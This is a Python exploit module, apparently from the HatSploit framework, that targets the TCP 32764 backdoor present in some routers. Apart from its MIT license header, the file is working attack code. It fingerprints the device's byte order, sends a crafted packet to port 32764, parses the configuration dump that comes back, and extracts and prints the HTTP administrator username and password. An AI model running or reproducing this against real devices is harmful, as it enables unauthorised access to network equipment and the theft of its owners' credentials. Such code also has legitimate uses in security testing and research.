#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import re
import struct

from core.lib.module import Module
from utils.http.http import HTTPClient
from utils.tcp.tcp import TCPClient


class HatSploitModule(Module, HTTPClient, TCPClient):
    details = {
        'Name': "TCP 32764 Backdoor Credentials Disclosure",
        'Module': "exploit/unix/multi/32764_credentials_disclosure",
        'Authors': [
            'Ivan Nikolsky (enty8080)'
        ],
        'Description': "Credentials disclosure in multiple devices through TCP 32764 backdoor.",
        'Dependencies': [
            ''
        ],
        'Comments': [
            ''
        ],
        'Platform': "unix",
        'Risk': "high"
    }

    options = {
        'RHOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True
        }
    }

    def detect_endian(self, remote_host):
        sock = self.open(remote_host, 32764)
        if sock is None:
            self.output_error("Failed to detect endian!")
            return None

        sock.send(b"abcde")
        response = sock.recv(0xC)
        sock.close()

        sig, ret_val, ret_len = struct.unpack('<III', response)
        if sig == 0x53634D4D:
            return '<'
        if sig == 0x4D4D6353:
            return '>'
        else:
            self.output_error("Failed to detect endian!")
            return None

    def exploit(self, remote_host):
        self.output_process("Detecting endian...")
        endian = self.detect_endian(remote_host)

        if endian is None:
            self.output_error("Exploit failed!")
            return

        self.output_process("Generating payload...")
        headers = struct.pack(endian + 'III', 0x53634D4D, 1, 1)
        payload = headers + b'\x00'

        self.output_process("Sending payload...")
        sock = self.open(remote_host, 32764)

        if sock is None:
            self.output_error("Failed to send payload!")
            return

        sock.send(payload)
        response = sock.recv(0xC)

        sig, ret_val, ret_len = struct.unpack(endian + 'III', response)
        response = sock.recv(ret_len)

        lines = re.split("\x00|\x01", response.decode())
        pattern = re.compile('user(name)?|password|login')

        username, password = "", ""
        for line in lines:
            try:
                variable, value = line.split("=")
                if len(value) > 0 and pattern.search(variable):
                    if variable == 'http_username':
                        username = value
                    elif variable == 'http_password':
                        password = value
            except Exception:
                pass

        if username and password:
            self.print_table("Credentials", ('Username', 'Password'), (username, password))
        else:
            self.output_warning("Target vulnerable, but no credentials found.")

    def run(self):
        remote_host = self.parse_options(self.options)

        self.output_process(f"Exploiting {remote_host}...")
        self.exploit(remote_host)
